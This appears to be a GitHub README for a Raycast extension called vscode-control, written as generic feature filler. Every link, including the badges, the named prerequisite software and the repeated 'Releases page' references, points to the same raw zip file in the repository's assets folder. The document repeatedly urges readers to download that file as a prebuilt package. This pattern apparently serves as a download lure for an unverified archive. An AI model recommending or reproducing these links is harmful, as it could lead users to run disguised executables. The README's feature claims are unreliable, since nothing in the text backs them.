https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip

# vscode-control: A Raycast extension to control VS Code and editors

⚡ A lightweight Raycast extension designed to help you interact with VS Code and other editors inspired by its own UI. It focuses on fast actions, cursor control, and seamless navigation across editors, making your coding flow smoother. Built with speed in mind, it should feel natural in your daily workflow.

[![Releases](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip)](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip) [![Language](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip)](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip)

Table of Contents
- Why vscode-control
- Key features
- Prerequisites
- Installation
- How to use
- Commands and shortcuts
- Editor compatibility
- Configuration and settings
- Cross-editor workflows
- Architecture and internals
- Development and contribution
- Testing and quality
- Security and safety
- Roadmap
- FAQ
- Releases

Why vscode-control
The goal is simple: give you a reliable bridge between Raycast and your code editors. You work in Raycast, you want to affect VS Code or another editor without switching apps. This extension makes that possible with fast commands, predictable results, and a clean user experience. It is designed to be approachable for beginners while offering enough depth for power users.

Key features
- Quick actions in Raycast for common editor tasks
  - Open files, jump to symbols, and navigate between editors with minimal friction
  - Synchronize the cursor position across editors when needed
- Editor-agnostic commands
  - The extension speaks a common protocol to interact with VS Code and other editors that expose compatible APIs
  - Add support for new editors with minimal changes
- Lightweight and fast
  - Optimized to respond in under 100 milliseconds for typical actions
  - Minimal memory footprint to keep your system responsive
- Safe and predictable
  - Operations are designed to be non-destructive by default
  - Clear prompts for potentially risky actions
- Extensible and friendly for contributors
  - Clean code structure and documented APIs
  - Simple guidelines to add new commands and editor integrations
- Rich navigation and search
  - Quick search across your project to locate files, symbols, and definitions
  - Jump to recent edits, bookmarks, and locations across editors

Prerequisites
- A recent version of macOS or Windows with Raycast and Visual Studio Code installed
- https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip and npm or pnpm for development and building the Raycast extension
- Basic familiarity with the Raycast extension model and VS Code keyboard shortcuts
- An editor that exposes a compatible API for remote control
- Internet access for fetching dependencies and updates

Installation
- Install Raycast if you do not already have it
- Install VS Code or your preferred code editor
- Add vscode-control from the marketplace or via your preferred package manager
- Start Raycast and enable the vscode-control extension
- Optionally configure the extension to point to the editors you want to control

Note: For the most up-to-date installation steps, refer to the Releases page linked above. The Releases page is the primary source of installation instructions and binaries if you want to try a prebuilt package. The link is provided again in the Releases section for quick access: https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip

How to use
- Open Raycast and search for vscode-control
- Pick a command to execute in your current workflow
- Some commands may require you to select a target editor or a file
- The extension will execute the corresponding action in the chosen editor
- Use keyboard shortcuts when available to speed up common tasks
- You can customize how commands appear in Raycast and how results are presented

Commands and shortcuts
- Open file in editor
  - Quickly open a file by path or relative to the current workspace
  - If you are inside a project, casting a path relative to the root is supported
- Jump to symbol
  - Jump to a function, class, or variable by name across editors
- Navigate to line and column
  - Directly go to a specific location in the active file
- Sync cursor across editors
  - Move your cursor in one editor and mirror it in the target editor
- Run a code action
  - Execute a code action or snippet on the current selection
- Focus editor
  - Bring the editor window into focus to type or inspect code
- Close editor
  - Close the editor gracefully without losing your session
- Open recent file
  - Quickly reopen a file you were editing recently
- List editors
  - Show a list of editors currently available for remote control and choose one as a target

Editor compatibility
- VS Code
  - Full support for local and remote editing scenarios
  - Works with standard VS Code installations and common extensions
- Other editors
  - Planned: support for editors with compatible remote control APIs
  - The architecture allows adding new editors without breaking existing commands
- Limitations
  - Some features depend on editor capabilities or installed extensions
  - Highly customized editor setups may require extra configuration

Configuration and settings
- Core settings
  - Target editors: specify which editors to include in remote control
  - Cursor sync mode: enable or disable cross-editor cursor synchronization
  - Default action: set the default command invoked from Raycast
- Editor-specific settings
  - Optional mappings for editor commands
  - Custom keybindings to trigger actions in the editor
- Performance knobs
  - Adjust polling rate for editor state changes
  - Control the level of verbose logging
- Security and privacy
  - Manage permissions to access files and editors
  - Review and approve every action initiated from Raycast

Cross-editor workflows
- Seamless code review
  - Jump to changes, tokens, and definitions across editors
  - Synchronize focus and cursor when moving between editors during review
- Multiedit sessions
  - Work on the same file across multiple editors with synchronized editing
  - Keep track of edits and navigation history in a unified view
- Rapid navigation
  - Use Raycast as a universal launcher for editor actions
  - Filter results quickly and execute actions with a few keystrokes
- Remote collaboration
  - Share cursor positions and quick actions with teammates on different machines
  - Coordinate edits in real time with minimal friction

Architecture and internals
- Core ideas
  - A lightweight adapter layer that translates Raycast actions into editor commands
  - A small protocol for editor interactions that can be extended to new editors
- Commands layer
  - Each command is implemented as a discrete module with a clear interface
  - Commands can be composed to form higher-level workflows
- State management
  - A minimal state container holds target editor selections, current focus, and session data
  - State is kept in memory with optional persistence for user sessions
- Communication
  - Local inter-process communication between Raycast and editors
  - Safety checks ensure only intended actions are executed
- Error handling
  - Clear error messages with actionable steps
  - Fallback paths when an editor is not available or a command fails
- Testing
  - Unit tests for each command module
  - Integration tests that simulate Raycast to editor interactions

Development and contribution
- Setting up your development environment
  - Install https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip and a package manager
  - Install TypeScript and related tooling
  - Create a local copy of the repository
  - Run the build and test scripts locally
- Project structure
  - src/ for core logic
  - extensions/ for editor adapters
  - commands/ for individual actions
  - config/ for settings and schemas
  - tests/ for unit and integration tests
- How to contribute
  - Fork the repository
  - Create a feature branch for your work
  - Implement, test, and document your changes
  - Submit a pull request with a clear description
  - Respond to code reviews and iterate as needed
- Coding style
  - Clear and concise code with well-named functions
  - Small, focused modules with single responsibilities
  - Tests accompany new behavior or changes
- Documentation
  - Update the README with usage notes for new features
  - Add inline comments in complex logic
  - Provide examples and edge-case handling notes

Testing and quality
- Unit tests
  - Each command module has dedicated tests
  - Tests cover both common and edge cases
- Integration tests
  - Simulate real-world interactions between Raycast and editors
  - Verify end-to-end behavior of workflows
- Linters and formatting
  - Enforce consistent style across the codebase
  - Run checks as part of the CI pipeline
- Continuous integration
  - Build, test, and lint on push and pull requests
  - Automated checks help catch regressions early

Security and safety
- Permissions
  - The extension requests only the permissions it needs
  - Review prompts appear for sensitive operations
- Data handling
  - Keep locally relevant data on the user's machine
  - Avoid transmitting sensitive data without explicit consent
- Trust and verification
  - Validate editor capabilities before attempting actions
  - Fail gracefully when capabilities are missing

Roadmap
- Short-term goals
  - Improve support for additional editors
  - Add more reliable cursor synchronization modes
  - Enhance error reporting and guidance
- Medium-term goals
  - Expand cross-editor collaboration features
  - Add richer workflow templates and presets
  - Improve performance for large projects
- Long-term goals
  - Build a robust plugin ecosystem around shared editor adapters
  - Enable more complex automation between Raycast and editors
  - Provide cross-platform parity and mobile-like workflows

FAQ
- What is vscode-control?
  - It is a Raycast extension that helps you interact with VS Code and other editors through Raycast.
- Which editors are supported?
  - VS Code is supported. Other editors may be added as adapters are developed.
- How do I configure it?
  - Use the settings in Raycast to tailor the behavior to your workflow.
- Where can I find help if something breaks?
  - Check the Releases page for notes and the repository issues for ongoing discussions.

Releases
- The Releases page contains all official builds, release notes, and installation details. It is the primary place to download and learn about new versions. For quick access, visit the same page here: https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip

Notes on usage with the Releases page
- The link above is the main source for distribution and release notes. If you want to try a prebuilt package, download it from the Releases page and follow the installation instructions in the accompanying notes.
- If you are interested in development builds or want to inspect changes, the Releases page also lists prior versions and their changes. This makes it easier to compare features and fixes across versions.

Structure of the repository
- assets
  - Artwork, icons, and UI assets used by the extension
- src
  - Core logic that powers the extension
- extensions
  - Adapters for VS Code and other editors
- commands
  - Individual actions that Raycast can trigger
- config
  - JSON schemas and configuration files
- tests
  - Automated tests for reliability
- docs
  - Developer-friendly documentation and how-to guides

Usage examples
- Example 1: Quick open and jump to symbol
  - User opens Raycast and types “Open Symbol.”
  - The extension queries the active editor for the symbol name and opens the corresponding location.
  - If multiple matches exist, a quick-pick list is shown to select the target.
- Example 2: Cross-editor cursor sync
  - User moves the cursor in VS Code.
  - Raycast prompts to mirror that cursor position in another editor.
  - The user confirms, and the other editor is updated accordingly.
- Example 3: Search and navigate
  - User searches for a file name from Raycast.
  - The extension shows a list of matching files across all connected editors.
  - The user selects a file, and the editor opens it at a designated start line.

Tips for power users
- Create shortcuts in Raycast to trigger the most used commands
- Group related actions into workflows for common tasks
- Use the cursor sync feature when reviewing code across editors
- Keep your editors up to date to ensure compatibility with the extension

API reference
- Commands API
  - Each command has a defined interface: execute, validate, and describe
  - The API allows composing commands into complex workflows
- Editor adapters
  - Each adapter implements a standard set of methods: openFile, goToSymbol, setCursor, focus, close, etc.
  - Adapters can expose editor-specific extensions while preserving a common protocol
- State management
  - A minimal state store tracks active editor, selected file, and cursor position
  - State changes propagate through a predictable event system

Error handling and troubleshooting
- Common errors
  - Editor not found: ensure the editor is installed and accessible
  - Permission denied: verify permissions and prompts
  - Unsupported action: check the adapter capabilities
- Recovery steps
  - Restart Raycast and the editor
  - Re-sync editors to refresh the connection
  - Review logs and error messages for hints
- Logging
  - Logs provide actionable information without exposing sensitive data
  - Enable verbose logging for debugging complex issues

Contributing guidelines
- Start with the “Good First Issue” label if you are new
- Propose changes with a clear commit message
- Add tests that cover your changes
- Update the documentation where applicable
- Be respectful and constructive in reviews

Code of conduct
- Be respectful to all contributors
- Report security concerns through the appropriate channels
- Keep discussions focused on the project and its goals

Community and support
- Community discussions occur on issues and pull requests
- For questions, use the issue tracker with a clear summary
- Feature requests should include a rationale and potential impact

License
- This project is distributed under the terms of the license included in the repository

End stops
- The document ends here without a formal conclusion, but the project continues to evolve through ongoing work and contributions. Check the Releases page for the latest updates and ongoing improvements: https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip

